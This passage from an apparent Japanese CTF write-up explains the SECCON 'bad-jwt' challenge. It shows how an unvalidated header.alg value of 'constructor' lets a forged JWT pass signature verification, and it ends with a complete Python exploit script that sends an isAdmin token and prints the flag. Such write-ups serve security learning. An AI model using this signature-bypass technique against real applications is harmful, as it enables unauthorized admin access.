</span></span></code></pre></div><p><code>algorithms</code>は署名アルゴリズム<code>HS256</code>と<code>HS512</code>の署名作成関数を含むオブジェクトですが、<code>createSignature</code>で<code>algorithms</code>を使用する際のプロパティアクセスに、ユーザの入力値である<code>header.alg</code>が未検証で使用されています。</p><p>署名検証を行う<code>verify</code>関数を確認すると、<code>createSignature</code>の呼び出し結果である<code>calculated_signature</code>を制御できると、署名検証をバイパスできることがわかります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>verify</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>token</span>, <span style=color:#a6e22e>secret</span>) =&gt; {
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>header</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>signature</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>expected_signature</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>parseToken</span>(<span style=color:#a6e22e>token</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>calculated_signature</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>createSignature</span>(<span style=color:#a6e22e>header</span>, <span style=color:#a6e22e>payload</span>, <span style=color:#a6e22e>secret</span>);
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>calculated_buf</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#a6e22e>calculated_signature</span>, <span style=color:#e6db74>&#39;base64&#39;</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>expected_buf</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>from</span>(<span style=color:#a6e22e>expected_signature</span>, <span style=color:#e6db74>&#39;base64&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;calculated_signature: &#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>calculated_signature</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;calculated_buf: &#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>calculated_buf</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;expected_signature: &#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>expected_signature</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;expected_buf: &#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>expected_buf</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>Buffer</span>.<span style=color:#a6e22e>compare</span>(<span style=color:#a6e22e>calculated_buf</span>, <span style=color:#a6e22e>expected_buf</span>) <span style=color:#f92672>!==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>throw</span> Error(<span style=color:#e6db74>&#39;Invalid signature&#39;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>payload</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>ここで、<code>header.alg</code>に<code>constructor</code>を指定することを考えます。node.jsのオブジェクトはあらかじめ<a href=https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor>constructor</a>を持っています。</p><p>実際にheaderを<code>{"typ":"JWT","alg":"constructor"}</code>、payloadを<code>{"isAdmin":True}</code>としたJWT <code>eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjogdHJ1ZX0.</code>を送信します。すると、<code>calculated_signature</code>はheaderとpayloadを連結したものになります。</p><pre tabindex=0><code>calculated_signature: eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ
calculated_buf: {&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;constructor&#34;}{&#34;isAdmin&#34;:true}
</code></pre><p><code>calculated_buf</code>と<code>expected_buf</code>を一致させ、署名検証をバイパスするために、<code>signature</code>として<code>{"typ":"JWT","alg":"constructor"}{"isAdmin":true}</code>をbase64 urlエンコードしたものを送信します。</p><p>最終的に以下のPythonコードを実行することでflagが得られます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>base_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://bad-jwt.seccon.games:3000/&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>base64_url_encode</span>(data):
</span></span><span style=display:flex><span>    base64_encoded <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(data)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> base64_encoded<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;+&#39;</span>, <span style=color:#e6db74>&#39;-&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;/&#39;</span>, <span style=color:#e6db74>&#39;_&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;=&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    header <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;typ&#34;</span>:<span style=color:#e6db74>&#34;JWT&#34;</span>,<span style=color:#e6db74>&#34;alg&#34;</span>:<span style=color:#e6db74>&#34;constructor&#34;</span>}
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;isAdmin&#34;</span>:<span style=color:#66d9ef>True</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    header_base64 <span style=color:#f92672>=</span> base64_url_encode(json<span style=color:#f92672>.</span>dumps(header)<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
</span></span><span style=display:flex><span>    payload_base64 <span style=color:#f92672>=</span> base64_url_encode(json<span style=color:#f92672>.</span>dumps(payload)<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
</span></span><span style=display:flex><span>    signature <span style=color:#f92672>=</span> base64_url_encode(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;constructor&#34;}{&#34;isAdmin&#34;:true}&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    jwt <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>header_base64<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>payload_base64<span style=color:#e6db74>}</span><span style=color:#e6db74>.</span><span style=color:#e6db74>{</span>signature<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    resp <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(base_url, cookies<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;session&#34;</span>: jwt})
</span></span><span style=display:flex><span>    print(resp<span style=color:#f92672>.</span>text) <span style=color:#75715e># SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}</span>
</span></span></code></pre></div><h1 id=おわりに>おわりに</h1><p>チームメンバーが大健闘してくれましたが、結局W◯ni Hack○seには勝てませんでした。悔しいです。急遽参加してくださったhamayanさん、チームメンバー、運営の方々ありがとうございました！</p><p><img src=/images/posts/40/result.png alt=result></p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>